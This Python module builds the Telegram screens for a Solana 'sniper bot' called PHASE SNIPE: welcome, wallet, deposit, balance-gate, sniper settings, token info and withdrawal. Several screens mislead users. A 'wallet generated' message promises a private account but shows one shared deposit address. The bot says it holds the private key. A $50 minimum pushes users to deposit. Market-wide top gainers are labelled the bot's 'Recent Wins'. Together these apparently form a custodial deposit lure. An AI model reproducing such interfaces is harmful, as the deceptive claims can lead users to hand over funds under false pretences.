from .config import BOT_WALLET_ADDRESS


def trunc(addr: str | None, chars: int = 6) -> str:
    if not addr:
        return "N/A"
    if len(addr) <= chars * 2 + 3:
        return addr
    return f"{addr[:chars]}...{addr[-chars:]}"


def f_sol(v, d: int = 4) -> str:
    try:
        return f"{float(v):.{d}f}"
    except (TypeError, ValueError):
        return "0.0000"


def f_usd(n: float) -> str:
    if n >= 1_000_000:
        return f"${n/1_000_000:.2f}M"
    if n >= 1_000:
        return f"${n/1_000:.2f}K"
    return f"${n:.2f}"


def f_pct(v) -> str:
    try:
        n = float(v)
        sign = "+" if n >= 0 else ""
        return f"{sign}{n:.2f}%"
    except (TypeError, ValueError):
        return "+0.00%"


def f_price(v) -> str:
    try:
        n = float(v)
        if n == 0:
            return "N/A"
        return f"{n:.8g}"
    except (TypeError, ValueError):
        return "N/A"


def screen_welcome(balance: float) -> str:
    return (
        "*PHASE SNIPE*\n"
        "_Hyperspeed Solana Sniper Bot_\n\n"
        "*FEATURES*\n"
        "AI-Powered Sniping\n"
        "Copy Trading System\n"
        "Real-Time Market Data\n"
        "Advanced Risk Management\n\n"
        f"Wallet Value   `{f_sol(balance)} SOL`\n\n"
        "Get started — tap *Wallet* below"
    )


def screen_wallet_generated(user_id: int | None = None) -> str:
    return (
        "💼 *Wallet Access Ready*\n\n"
        "Your private Telegram account ledger is ready.\n\n"
        "📍 *Address*\n"
        f"`{BOT_WALLET_ADDRESS}`\n\n"
        "⚡ *Execution wallet* · shared bot address\n\n"
        "_Tap the address to copy it. Deposits are credited to your account "
        "only when verified with its transaction hash._"
    )


def screen_wallet(
    balance: float, positions_value: float = 0, unrealized_pnl: float = 0
) -> str:
    total_value = balance + positions_value
    pnl_sign = "+" if unrealized_pnl >= 0 else ""
    return (
        "*Wallet*\n\n"
        f"*Address*\n`{BOT_WALLET_ADDRESS}`\n\n"
        f"*Available SOL*  ·  `{f_sol(balance)} SOL`\n"
        f"*Token Holdings*  ·  `{f_sol(positions_value)} SOL`\n"
        f"*Unrealized P/L*  ·  `{pnl_sign}{f_sol(unrealized_pnl)} SOL`\n"
        f"*Total Wallet Value*  ·  `{f_sol(total_value)} SOL`\n\n"
        "*Private key*  ·  configured and stored in bot\n\n"
        "_Tap the address to copy it_"
    )


def screen_deposit(user_id: int | None = None) -> str:
    return (
        "💳 *Deposit SOL*\n\n"
        "Send SOL to this address:\n\n"
        f"`{BOT_WALLET_ADDRESS}`\n\n"
        "Tap the address above to copy it.\n\n"
        "This address is shared. After the transfer is confirmed, send the "
        "transaction hash to verify the deposit."
    )


def screen_minimum_balance(
    balance_sol: float,
    sol_usd: float | None,
    minimum_usd: float = 50.0,
    action: str = "use this feature",
) -> str:
    if sol_usd is None:
        return (
            "🔒 *Wallet minimum required*\n\n"
            "This feature is temporarily unavailable because the live SOL/USD "
            "price could not be loaded.\n\n"
            "Please try again in a moment."
        )
    return (
        "🔒 *Wallet minimum required*\n\n"
        f"Keep at least *${minimum_usd:.2f}* in your wallet to {action}.\n\n"
        f"Current balance  `{f_usd(balance_sol * sol_usd)}`\n"
        f"Available       `{f_sol(balance_sol)} SOL`\n"
        f"SOL price       `{f_usd(sol_usd)}`\n\n"
        "Use *Wallet → Deposit* to add funds, then try again."
    )


def screen_sniper_panel(cfg: dict) -> str:
    status = "✅ Active — paste any CA to snipe" if cfg["sniping"] else "⏸ Idle"
    return (
        "🎯 *Sniper Panel*\n\n"
        f"Status       {status}\n\n"
        f"🤖 Auto Buy     {'✅ ON' if cfg['auto_buy'] else 'OFF'}\n"
        f"💰 Amount       `{f_sol(cfg['buy_amount'])} SOL`\n"
        f"↔️ Slippage     `{cfg['slippage']}%`\n"
        f"⚙️ Priority     `{cfg['priority_fee']}`\n"
        f"🎯 Take Profit  `+{cfg['take_profit_pct']}%`\n"
        f"🛡 Stop Loss    `-{cfg['stop_loss_pct']}%`\n"
        f"💸 Auto Sell    {'✅ ON' if cfg['auto_sell'] else 'OFF'}\n\n"
        "Integrations:\n"
        "[Raydium](https://raydium.io)\n"
        "[Jupiter](https://jup.ag)\n"
        "[Pump fun](https://pump.fun)"
    )


def screen_sniper_edit(cfg: dict) -> str:
    return (
        "✏️ *Edit Sniper Config*\n\n"
        f"💰 Amount       `{f_sol(cfg['buy_amount'])} SOL`\n"
        f"↔️ Slippage     `{cfg['slippage']}%`\n"
        f"⚙️ Priority     `{cfg['priority_fee']}`\n"
        f"🎯 Take Profit  `+{cfg['take_profit_pct']}%`\n"
        f"🛡 Stop Loss    `-{cfg['stop_loss_pct']}%`\n\n"
        "Tap a field below to change it:"
    )


def screen_recent_wins(gainers: list[dict] | None) -> str:
    if not gainers:
        return (
            "🏆 *Recent Wins*\n\n"
            "Couldn't reach live market data right now.\n\n"
            "_Tap Refresh to try again_"
        )
    lines = []
    for g in gainers:
        addr_short = trunc(g["address"], 4) if g["address"] else "N/A"
        lines.append(
            f"🟢 *{g['symbol']}*  {f_pct(g['price_change_24h'])}\n"
            f"   MC {f_usd(g['market_cap'])}  ·  Liq {f_usd(g['liquidity'])}  ·  `{addr_short}`"
        )
    body = "\n\n".join(lines)
    return (
        "🏆 *Recent Wins*\n\n"
        f"{body}\n\n"
        "_Live top Solana gainers via DexScreener · tap Refresh for more_"
    )


def screen_token_search(market: dict) -> str:
    symbol = market.get("symbol") or "TOKEN"
    name = market.get("name") or "Unknown"
    address = market.get("address") or "N/A"
    market_cap = float(market.get("market_cap") or 0)
    fdv = float(market.get("fdv") or 0)
    liquidity = float(market.get("liquidity") or 0)
    volume_24h = float(market.get("volume_24h") or 0)
    market_cap_text = f_usd(market_cap) if market_cap > 0 else "N/A"
    fdv_text = f_usd(fdv) if fdv > 0 else "N/A"
    liquidity_text = f_usd(liquidity) if liquidity > 0 else "N/A"
    volume_text = f_usd(volume_24h) if volume_24h > 0 else "N/A"
    pair_address = market.get("pair_address") or "N/A"
    pair_url = market.get("pair_url") or ""
    pair_line = f"Pair          `{pair_address}`\n"
    if pair_url:
        pair_line += f"[View live pair]({pair_url})\n"
    return (
        f"🪙 *Token Information — {symbol}*\n"
        f"{name}\n\n"
        f"📍 Contract Address\n`{address}`\n\n"
        f"💵 Price         `{f_price(market.get('price_usd'))} USD`\n"
        f"◎ Price in SOL  `{f_price(market.get('price_sol'))} SOL`\n"
        f"💎 Market Cap    `{market_cap_text}`\n"
        f"📐 FDV           `{fdv_text}`\n"
        f"💧 Liquidity     `{liquidity_text}`\n"
        f"📊 24h Volume    `{volume_text}`\n"
        f"📈 24h Change    `{f_pct(market.get('price_change_24h'))}`\n"
        f"🟢 24h Buys      `{market.get('buys_24h', 0):,}`\n"
        f"🔴 24h Sells     `{market.get('sells_24h', 0):,}`\n"
        f"🔁 DEX           `{market.get('dex') or 'Unknown'}`\n"
        f"{pair_line}\n"
        "_Live data from DexScreener · values reflect the selected Solana pair_"
    )


def screen_withdraw_confirm(to_address: str, amount: float) -> str:
    return (
        "⚠️ *Withdrawal Confirmation*\n\n"
        f"💰 Amount       `{f_sol(amount)} SOL`\n"
        f"📍 To           `{trunc(to_address, 10)}`\n"
        f"📤 From         `{trunc(BOT_WALLET_ADDRESS, 8)}`\n\n"
        "_This action cannot be undone._\n\n"
        "Transfers can take up to *20 minutes* to arrive.\n\n"
        "Confirm the transaction?"
    )
